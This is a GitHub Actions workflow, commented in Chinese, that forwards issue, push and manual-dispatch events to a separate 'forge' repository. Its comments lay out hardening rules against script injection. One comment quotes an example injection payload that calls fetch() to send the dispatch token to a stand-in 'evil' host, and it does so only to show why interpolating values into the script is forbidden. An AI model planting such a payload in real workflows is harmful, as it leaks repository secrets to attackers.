name: forward-to-forge

# 本 workflow 只做一件事：把事件原样转告 forge。
# 硬规矩（细则见 market-spec/03 §2.6）：
#   1. 不 checkout —— 没有任何仓库内容进入执行环境（包括 issue 正文）
#   2. run:/script: 里零 ${{ }} 插值 —— 外部值全部走 env:（${{ }} 在那里是文本拼接，会脚本注入）
#   3. 跳过在 job 级 —— 被跳过的 job 根本拿不到 secret（这里没有权限门禁，见下）
#   4. 转发的是「信标」不是「数据」—— 只带事件名（手动按钮时是 verb，见下）/issue 号/sha，
#      内容由 forge 自己用 API 读

on:
  issues:
    types: [opened, edited]
  # ⚠️ 这里**没有** `release` —— 别再把它加回来。
  # `_incoming` 队列常驻 draft（03 §3.2），搬运只能被显式叫起来：人点手动按钮
  # （本仓库的下面那个，或 forge 的 on-dispatch），或上传 CI 自己发信标。从前那条
  # `release: [published]` 会在**任何**
  # Release 发布时打进 forge，迫使 forge 侧再挂一道闸门去筛"是不是 _incoming"；
  # 而它真正想覆盖的"人手动 Publish 队列发车"那条路已经不存在了。
  push:
    # 只有输入面变化才需要重算；产物（根目录的 apps.json 与 store/**）由 forge 回写，不需要转发
    paths: ['sources/**']
  # 手动按钮：**人上传完 APK 之后点这里**（03 §3.2）。这是本仓库里唯一需要人踩的一脚 ——
  # 队列常驻 draft，往 Release 上传/改名/删 asset 都不触发任何事件（§3.3），所以传完文件
  # 不会有谁自动来搬。CI 那条路（publish-apk.yml）不需要这个按钮，它直接发信标。
  #
  # why 按钮在本仓库而不是只在 forge：人是在**本仓库**的 Release 页面上传的文件，按钮就该
  # 在同一页的 Actions 里，省掉一次仓库切换（也省掉"我到底该去哪个仓点什么"）。forge 那边
  # 的 on-dispatch 同样通，效果一样，留着它是因为改 forge-core 的人常在那儿调试。
  #
  # why choice 而不是自由文本：choice 的取值由 GitHub 服务端**先校验**（只可能是下面 options
  # 里的字面量），到 job 里时已经是一个封闭集合的成员 —— 而它随后仍然走 env: 传下去、
  # script: 里一个字都不插值，与 issue 标题那条路同一个规矩。
  #
  # 缺省 intake-incoming 而不是 reconcile：这个按钮的日常用途是"我刚传完文件"；而 reconcile
  # 是"让 forge 把上游重新对一遍"，那件事另有每日 cron 兜着，不着急。
  workflow_dispatch:
    inputs:
      verb:
        description: 手动跑哪一件事
        type: choice
        options:
          - intake-incoming
          - reconcile
        default: intake-incoming

permissions: {}            # 不需要 GITHUB_TOKEN 的任何权限（走 PAT）

jobs:
  forward:
    runs-on: ubuntu-latest
    # 唯一的守卫：防自激回声。forge 每次回写都由 CommitBack 无条件补上
    # [skip-dispatch]（internal/job/ctx.go），而它写 sources/（收录与变更单都写）
    # 恰好落在上面的 paths 里 —— PAT 触发的 push 不会被 GitHub 抑制，不拦就是
    # 「回写 → 转发 → 再回写」，每收录一个应用白烧一轮最长 90 分钟的对账。
    #
    # ⚠️ 写成「非 push 事件直接放行」，**不要**把两件事塞进同一条 && 链。
    # github.event.head_commit 只在 push 事件里存在，issue 事件里去取它会让整条
    # 表达式判假 —— 症状是 run 一闪而过、结论 skipped、日志一个字都没有。
    #
    # 上面两句原本和一条按 author_association 挡陌生人的门禁串在同一条 && 里：
    # issue 事件上 head_commit 与那条门禁必有一个取不到值，整条就判假了 ——
    # 而 store 是私有仓库，非成员连 issue 都开不了，那条门禁挡不到任何人，已删。
    if: github.event_name != 'push' || !contains(github.event.head_commit.message, '[skip-dispatch]')
    steps:
      - name: Dispatch forge
        # GitHub 官方的 API 客户端 action（node24，无第三方依赖树）。选它而不是
        # 手写 curl，是为了让 payload 走 octokit 的 JSON 序列化：老写法里
        # `"ref":"%s"` 是**没有转义**的，而 git 的 refname 规则禁空格、
        # `~^:?*[\`、`..`、`@{`，**却不禁止 `"`** —— 一个叫 `v1.0"x` 的分支名
        # 就能把那串 JSON 拼坏。顺带白拿指数退避重试。
        #
        # 用主版本标签（`@v9`），不钉 commit SHA：升级交给同目录的 dependabot.yml
        # 每周开 PR。钉 SHA 更抗供应链，但每次升级都要人工查 SHA，而 SHA 写错是
        # 静默失败 —— 取舍是有意的。
        uses: actions/github-script@v9
        env:
          # ⚠️ 一切外部数据只经 env 传入；script: 里**一处 ${{ }} 都没有**。
          # script: 不是 shell，但 ${{ }} 在这里同样是**文本拼接** —— 往里面塞
          # 一个 `'); fetch('https://evil/?'+process.env.DISPATCH_TOKEN); //`
          # 效果和在 run: 里注入完全一样。这是硬规矩 2，不是 shell 专属的规矩。
          DISPATCH_TOKEN: ${{ secrets.GH_PAT }}
          # 手动按钮时 `verb` 才是主角（上面 choice 的封闭集合）；其余事件用事件名。
          # 两者落进**同一个**键，因为 forge 侧读的就是 client_payload.event。
          EVENT: ${{ github.event.inputs.verb || github.event_name }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
          REF: ${{ github.ref }}
          SHA: ${{ github.sha }}
        with:
          # 走 PAT：GITHUB_TOKEN 不能跨仓库（§6.2 不变量 1）。
          github-token: ${{ secrets.GH_PAT }}
          # 瞬时 5xx 指数退避重试。401/403/404/422 按 action 默认值**不**重试 ——
          # 那些重试也没用（token 错就是错），只会把一次失败拖成四次。
          retries: 3
          script: |
            // 与老写法里的 `echo "::add-mask::"` 等价。GitHub 本就会自动遮蔽
            // secrets.* 的值，这里显式再来一次，是为了不去依赖"自动遮蔽"这个行为。
            core.setSecret(process.env.DISPATCH_TOKEN)

            await github.rest.repos.createDispatchEvent({
              owner: 'market-of-labs',
              repo: 'forge',
              event_type: 'store-event',
              client_payload: {
                event: process.env.EVENT,
                issue: Number(process.env.ISSUE_NUMBER || 0),
                repo: `${context.repo.owner}/${context.repo.repo}`,
                ref: process.env.REF || '',
                sha: process.env.SHA || '',
              },
            })
